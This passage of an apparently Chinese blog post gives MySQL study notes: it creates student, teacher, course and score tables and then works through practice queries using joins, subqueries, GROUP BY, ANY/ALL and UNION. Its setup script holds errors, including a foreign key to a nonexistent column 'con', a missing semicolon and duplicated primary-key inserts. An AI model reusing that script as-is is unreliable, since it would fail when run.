class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE mysql_test;<br>   <br>USE mysql_test;<br>   <br>CREATE TABLE<br>    Student(<br>        sno VARCHAR(20) PRIMARY KEY,<br>        sname VARCHAR(20) NOT NULL,<br>        ssex VARCHAR(10) NOT NULL,<br>        sbirthday DATETIME NOT NULL,<br>        class VARCHAR(20) NOT NULL<br>    );<br>   <br>DROP TABLE student;<br>   <br>-- 提前准备<br>   <br>CREATE TABLE<br>    Teacher(<br>        tno VARCHAR(20) PRIMARY KEY,<br>        tname VARCHAR(20) NOT NULL,<br>        tsex VARCHAR(10) NOT NULL,<br>        tbirthday DATETIME,<br>        prof VARCHAR(20) NOT NULL,<br>        depart VARCHAR(20) NOT NULL<br>    );<br>   <br>CREATE TABLE<br>    Course(<br>        cno VARCHAR(20) PRIMARY KEY,<br>        cname VARCHAR(20) NOT NULL,<br>        tno VARCHAR(20) NOT NULL,<br>        FOREIGN KEY(tno) REFERENCES teacher(tno)<br>    )<br>   <br>DROP TABLE score;<br>   <br>CREATE TABLE<br>    score(<br>        sno VARCHAR(20) NOT NULL,<br>        cno VARCHAR(20) NOT NULL,<br>        degree DECIMAL NOT NULL,<br>        FOREIGN KEY(sno) REFERENCES Student(sno),<br>        FOREIGN KEY(cno) REFERENCES Course(con),<br>        PRIMARY KEY(sno, cno)<br>    );<br>   <br>-- 添加学生表的数据<br>   <br>INSERT INTO student VALUES(&#x27;101&#x27;, &#x27;曾华&#x27;, &#x27;男&#x27;, &#x27;1977-09-01&#x27;, &#x27;95033&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;102&#x27;, &#x27;匡明&#x27;, &#x27;男&#x27;, &#x27;1975-10-02&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;103&#x27;, &#x27;王丽&#x27;, &#x27;女&#x27;, &#x27;1976-01-23&#x27;, &#x27;95033&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;104&#x27;, &#x27;李军&#x27;, &#x27;男&#x27;, &#x27;1976-02-20&#x27;, &#x27;95033&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;105&#x27;, &#x27;王芳&#x27;, &#x27;女&#x27;, &#x27;1975-02-10&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;106&#x27;, &#x27;陆军&#x27;, &#x27;男&#x27;, &#x27;1974-06-03&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;107&#x27;, &#x27;王尼玛&#x27;, &#x27;男&#x27;, &#x27;1976-02-20&#x27;, &#x27;95033&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;108&#x27;, &#x27;张全蛋&#x27;, &#x27;男&#x27;, &#x27;1975-02-10&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;109&#x27;, &#x27;赵铁柱&#x27;, &#x27;男&#x27;, &#x27;1974-06-03&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;101&#x27;, &#x27;曾华&#x27;, &#x27;男&#x27;, &#x27;1977-09-01&#x27;, &#x27;95033&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;102&#x27;, &#x27;匡明&#x27;, &#x27;男&#x27;, &#x27;1975-10-02&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;103&#x27;, &#x27;王丽&#x27;, &#x27;女&#x27;, &#x27;1976-01-23&#x27;, &#x27;95033&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;104&#x27;, &#x27;李军&#x27;, &#x27;男&#x27;, &#x27;1976-02-20&#x27;, &#x27;95033&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;105&#x27;, &#x27;王芳&#x27;, &#x27;女&#x27;, &#x27;1975-02-10&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;106&#x27;, &#x27;陆军&#x27;, &#x27;男&#x27;, &#x27;1974-06-03&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;107&#x27;, &#x27;王尼玛&#x27;, &#x27;男&#x27;, &#x27;1976-02-20&#x27;, &#x27;95033&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;108&#x27;, &#x27;张全蛋&#x27;, &#x27;男&#x27;, &#x27;1975-02-10&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO student VALUES(&#x27;109&#x27;, &#x27;赵铁柱&#x27;, &#x27;男&#x27;, &#x27;1974-06-03&#x27;, &#x27;95031&#x27;);<br>   <br>INSERT INTO teacher<br>VALUES (<br>        &#x27;804&#x27;,<br>        &#x27;李诚&#x27;,<br>        &#x27;男&#x27;,<br>        &#x27;1958-12-02&#x27;,<br>        &#x27;副教授&#x27;,<br>        &#x27;计算机系&#x27;<br>    );<br>   <br>INSERT INTO teacher<br>VALUES (<br>        &#x27;856&#x27;,<br>        &#x27;张旭&#x27;,<br>        &#x27;男&#x27;,<br>        &#x27;1969-03-12&#x27;,<br>        &#x27;讲师&#x27;,<br>        &#x27;电子工程系&#x27;<br>    );<br>   <br>INSERT INTO teacher<br>VALUES (<br>        &#x27;825&#x27;,<br>        &#x27;王萍&#x27;,<br>        &#x27;女&#x27;,<br>        &#x27;1972-05-05&#x27;,<br>        &#x27;助教&#x27;,<br>        &#x27;计算机系&#x27;<br>    );<br>   <br>INSERT INTO teacher<br>VALUES (<br>        &#x27;831&#x27;,<br>        &#x27;刘冰&#x27;,<br>        &#x27;女&#x27;,<br>        &#x27;1977-08-14&#x27;,<br>        &#x27;助教&#x27;,<br>        &#x27;电子工程系&#x27;<br>    );<br>   <br>show tables;<br>   <br>select * from teacher;<br>   <br>INSERT INTO course VALUES(&#x27;3-105&#x27;, &#x27;计算机导论&#x27;, &#x27;825&#x27;);<br>   <br>INSERT INTO course VALUES(&#x27;3-245&#x27;, &#x27;操作系统&#x27;, &#x27;804&#x27;);<br>   <br>INSERT INTO course VALUES(&#x27;6-166&#x27;, &#x27;数字电路&#x27;, &#x27;856&#x27;);<br>   <br>INSERT INTO course VALUES(&#x27;9-888&#x27;, &#x27;高等数学&#x27;, &#x27;831&#x27;);<br>   <br>-- 存入数据<br>   <br>INSERT INTO score VALUES(&#x27;103&#x27;, &#x27;3-105&#x27;, &#x27;92&#x27;);<br>   <br>INSERT INTO score VALUES(&#x27;103&#x27;, &#x27;3-245&#x27;, &#x27;86&#x27;);<br>   <br>INSERT INTO score VALUES(&#x27;103&#x27;, &#x27;6-166&#x27;, &#x27;85&#x27;);<br>   <br>INSERT INTO score VALUES(&#x27;105&#x27;, &#x27;3-105&#x27;, &#x27;88&#x27;);<br>   <br>INSERT INTO score VALUES(&#x27;105&#x27;, &#x27;3-245&#x27;, &#x27;75&#x27;);<br>   <br>INSERT INTO score VALUES(&#x27;105&#x27;, &#x27;6-166&#x27;, &#x27;79&#x27;);<br>   <br>INSERT INTO score VALUES(&#x27;109&#x27;, &#x27;3-105&#x27;, &#x27;76&#x27;);<br>   <br>INSERT INTO score VALUES(&#x27;109&#x27;, &#x27;3-245&#x27;, &#x27;68&#x27;);<br>   <br>INSERT INTO score VALUES(&#x27;109&#x27;, &#x27;6-166&#x27;, &#x27;81&#x27;);<br>   <br>SELECT * FROM score;<br></code></pre></td></tr></table></figure></li><li><p>查询student 表的所有记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from student;<br></code></pre></td></tr></table></figure></li><li><p>查询指定的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select sname,sno,ssex from student;<br><br></code></pre></td></tr></table></figure></li><li><p>查询某一列的所有的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 查询教师所有的单位<br><br>-- 重复<br><br>SELECT depart from teacher;<br><br>-- 不重复<br><br>SELECT DISTINCT depart from teacher;<br></code></pre></td></tr></table></figure></li><li><p>使用where 作为条件查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"><br>SELECT * FROM score WHERE DEGREE BETWEEN 60 and 80;<br><br>SELECT * FROM score WHERE DEGREE &gt;60 and DEGREE &lt;80;<br></code></pre></td></tr></table></figure></li><li><p>关系查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 表示或者关系的查询<br>SELECT * FROM score WHERE degree in(86,88);  -- 表示范围<br></code></pre></td></tr></table></figure></li><li><p>多条件查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 使用两个条件查询<br><br>SELECT * FROM student WHERE class=95031 AND ssex=&#x27;女&#x27;;<br></code></pre></td></tr></table></figure></li><li><p>升序降序查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 升序降序查表<br><br><br>-- 升序查表<br>SELECT * FROM student ORDER BY class ASC;<br><br>-- 降序查找<br>SELECT * FROM student ORDER BY class DESC;<br><br>-- 默认升序<br><br><br># 以班级和年龄从大到小排序查询student 表中全部的记录<br><br>SELECT * FROM student ORDER BY class DESC,sbirthday;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql"><br>SELECT * FROM score ORDER BY cno ASC,DEGREE DESC;<br></code></pre></td></tr></table></figure></li><li><p>查询’95031’班的人数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 统计人数<br><br>SELECT COUNT(*) FROM student WHERE class=&#x27;95031&#x27;;<br></code></pre></td></tr></table></figure></li><li><p>子查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"><br>-- 统计最高分<br><br>SELECT * FROM score WHERE degree=(SELECT MAX(degree) FROM score);<br></code></pre></td></tr></table></figure></li><li><p>计算不同组的平均数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 计算平均成绩<br>-- 计算某一个特定的值的平均数<br>SELECT AVG(DEGREE) FROM score where cno =&#x27;3-105&#x27;;<br><br><br>-- 计算组平均值<br>SELECT cno,AVG(DEGREE) FROM score GROUP BY cno;<br></code></pre></td></tr></table></figure></li><li><p>分组指定组内成员的数量，使用like匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 计算score 表中至少有两名学生选修，并以3开头的ban&#x27;j平均数<br><br>SELECT<br>    cno,<br>    AVG(DEGREE),<br>    COUNT(*)<br>FROM score<br>GROUP BY cno<br>HAVING<br>    COUNT(cno) &gt;= 2<br>    AND cno LIKE &#x27;3%&#x27;; <br></code></pre></td></tr></table></figure></li><li><p>带条件的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 查询分数大于70，小于90的sno列<br><br>SELECT sno,DEGREE FROM score WHERE degree&gt;70 and degree&lt;90;<br><br>SELECT sno FROM score WHERE degree BETWEEN 70 AND 90;<br><br></code></pre></td></tr></table></figure></li><li><p>分组后条件查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">    <br># 查询至少有两名男生的班号<br>    <br>SELECT class<br>FROM student<br>WHERE ssex=&#x27;男&#x27; GROUP BY class HAVING COUNT(*) &gt;1;<br></code></pre></td></tr></table></figure></li><li><p>日期求最大最小</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询student 中最大的sbirthday和最小<br><br>SELECT MAX(sbirthday)-MIN(sbirthday) FROM student;<br></code></pre></td></tr></table></figure></li></ol><h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><ol><li><p>第一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mysql"><br>SELECT<br>    student.sno,<br>    student.sname,<br>    score.cno,<br>    score.degree<br>from student<br>    JOIN score ON student.sno = score.sno;<br><br># 查询所有学生的son,cname,degree<br><br>SELECT<br>    score.sno,<br>    course.cname,<br>    score.degree<br>FROM score<br>    JOIN course ON course.cno = score.cno;<br></code></pre></td></tr></table></figure></li><li><p>隐式join和显示，建议使用显示的，隐式的不太清楚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询所有的学生的sname,cname,degree<br><br>SELECT<br>    student.sname,<br>    course.cname,<br>    score.degree<br>FROM student<br>    JOIN score ON student.sno = score.sno # 这两个不一样，也不能是student<br>    JOIN course ON score.cno = course.cno;<br><br><br>SELECT sname, cname, degree<br>FROM student, score, course<br>WHERE<br>    student.sno = score.sno<br>    and score.cno = course.cno;<br></code></pre></td></tr></table></figure></li><li><p>as起别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT<br>    student.sname as stu_name,<br>    course.cname,<br>    score.degree,<br>    score.cno as sco_con<br>FROM student<br>    JOIN score ON student.sno = score.sno<br>    JOIN course ON score.cno = course.cno;<br></code></pre></td></tr></table></figure></li></ol><h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><ol><li><p>使用in计算一类</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 查询<span class="hljs-number">95031</span>班，每个班的平均分<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(degree)<br><span class="hljs-keyword">from</span> score<br><span class="hljs-keyword">where</span> sno <span class="hljs-keyword">in</span> (<br>        <span class="hljs-keyword">SELECT</span> sno<br>        <span class="hljs-keyword">from</span> student<br>        <span class="hljs-keyword">WHERE</span> class <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;95031&#x27;</span><br>    ) <br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> cno; # 根据不同的学科分类<br><br><br><br># 查询所有教师的tname 和 depart<br><br><span class="hljs-keyword">SELECT</span> tname, depart<br><span class="hljs-keyword">FROM</span> teacher<br><span class="hljs-keyword">WHERE</span> tno <span class="hljs-keyword">IN</span> (<br>        <span class="hljs-keyword">SELECT</span> tno<br>        <span class="hljs-keyword">FROM</span> course<br>    );<br>    <br>    <br>    <br> # 查询男教师并且他们所上的课<br><br><span class="hljs-keyword">SELECT</span> cno, cname<br><span class="hljs-keyword">FROM</span> course<br><span class="hljs-keyword">WHERE</span> tno <span class="hljs-keyword">in</span> (<br>        <span class="hljs-keyword">SELECT</span> tno<br>        <span class="hljs-keyword">FROM</span> teacher<br>        <span class="hljs-keyword">WHERE</span> tsex <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;男&#x27;</span><br>    );<br></code></pre></td></tr></table></figure></li><li><p>子查询做限定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *<br>from score<br>WHERE degree &gt; (<br>        SELECT degree<br>        FROM score<br>        WHERE sno = 109 AND cno=&#x27;3-105&#x27;<br>    );<br>    <br># 查询3-105课程的成绩高于 109 同学 3-105 成绩的所有同学的记录<br>SELECT *<br>FROM score<br>WHERE cno = &#x27;3-105&#x27; and degree &gt; (<br>        SELECT degree<br>        FROM score<br>        WHERE<br>            sno = 109<br>            AND cno = &#x27;3-105&#x27;<br>    );<br>    <br><br># 查询成绩高于学号 109 课程号为 3-105 的成绩的所有记录<br><br>SELECT *<br>FROM score<br>WHERE cno = &#x27;3-105&#x27; and degree &gt; (<br>        SELECT degree<br>        FROM score<br>        WHERE<br>            sno = 109<br>            and cno = &#x27;3-105&#x27;<br>    );<br></code></pre></td></tr></table></figure></li></ol><h2 id="year-函数和-in-做限制条件"><a href="#year-函数和-in-做限制条件" class="headerlink" title="year 函数和 in 做限制条件"></a>year 函数和 in 做限制条件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询和学号 108 101 的同学同年出生的所有学生的sno sname 和 sbirthday<br><br>SELECT *<br>FROM student<br>WHERE YEAR(sbirthday) in(<br>        SELECT<br>            YEAR(sbirthday)<br>        FROM student<br>        WHERE<br>            sno in(108, 101)<br>    );<br></code></pre></td></tr></table></figure><h2 id="嵌套子查询"><a href="#嵌套子查询" class="headerlink" title="嵌套子查询"></a>嵌套子查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询 张旭 老师任课学生的成绩<br><br>SELECT *<br>FROM score<br>WHERE cno in (<br>        SELECT cno<br>        FROM course<br>        WHERE tno = (<br>                SELECT tno<br>                FROM teacher<br>                WHERE tname = &quot;张旭&quot;<br>            )<br>    );<br></code></pre></td></tr></table></figure><h2 id="多表查询plus"><a href="#多表查询plus" class="headerlink" title="多表查询plus"></a>多表查询plus</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询选修某课程的同学人数多于5人的教师名字<br><br>SELECT tname<br>FROM teacher<br>WHERE tno = (<br>        SELECT tno<br>        FROM course<br>        WHERE cno = (<br>                SELECT cno<br>                FROM score<br>                GROUP BY cno<br>                HAVING<br>                    COUNT(*) &gt; 5<br>            )<br>    );<br></code></pre></td></tr></table></figure><h2 id="any"><a href="#any" class="headerlink" title="any"></a>any</h2><p>任意一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询选修编号为“3-105“课程且成绩至少高于选修编号为“3-245&quot;的同学的Cn0、Sno和Deg re并按Deg ree从高到低次序排序。<br><br>SELECT *<br>FROM score<br>WHERE<br>    cno = &quot;3-105&quot;<br>    and degree &gt; ANY(<br>        SELECT degree<br>        FROM score<br>        WHERE cno = &#x27;3-245&#x27;<br>    )<br>ORDER BY degree DESC; <br># ASC 是升序<br></code></pre></td></tr></table></figure><h2 id="all"><a href="#all" class="headerlink" title="all"></a>all</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询选修编号为“3-105”且成绩高于选修编号为“3-245&quot;课程的同学的Cn0、Sno和Degree.<br><br>SELECT cno, sno, degree<br>FROM score<br>WHERE<br>    cno = &#x27;3-105&#x27;<br>    AND degree &gt; all(<br>        SELECT degree<br>        FROM score<br>        WHERE cno = &#x27;3-245&#x27;<br>    )<br>ORDER BY degree;<br></code></pre></td></tr></table></figure><h2 id="查询练习"><a href="#查询练习" class="headerlink" title="查询练习"></a>查询练习</h2><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询95033 or  95031的学生<br><br>SELECT * from student WHERE class in(&quot;95033&quot;,&quot;95031&quot;);<br></code></pre></td></tr></table></figure><h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询成绩在85以上的con<br><br>SELECT sno, cno,degree FROM score WHERE degree &gt; 85;<br><br></code></pre></td></tr></table></figure><h3 id="多表查询-1"><a href="#多表查询-1" class="headerlink" title="多表查询"></a>多表查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询计算机系老师所教的课程表<br><br>SELECT *<br>FROM course<br>    JOIN teacher ON course.tno = teacher.tno<br>WHERE<br>    teacher.depart like &quot;计算机%&quot;;<br><br>select * FROM course WHERE tno in (SELECT tno FROM teacher WHERE depart LIKE &quot;计算机_&quot;);<br></code></pre></td></tr></table></figure><h3 id="union和nion"><a href="#union和nion" class="headerlink" title="union和nion"></a>union和nion</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询 计算机系  与  电子工程系  不同职称的教师的tname  prof<br># union求并集<br>SELECT tname, prof<br>FROM teacher<br>WHERE<br>    depart LIKE &quot;电子%&quot;<br>    AND prof NOT IN(<br>        SELECT DISTINCT prof<br>        FROM teacher<br>        WHERE<br>            depart like &quot;计算机%&quot;<br>    )<br>UNION<br>SELECT tname, prof<br>FROM teacher<br>WHERE<br>    depart LIKE &quot;计算%&quot;<br>    AND prof NOT IN(<br>        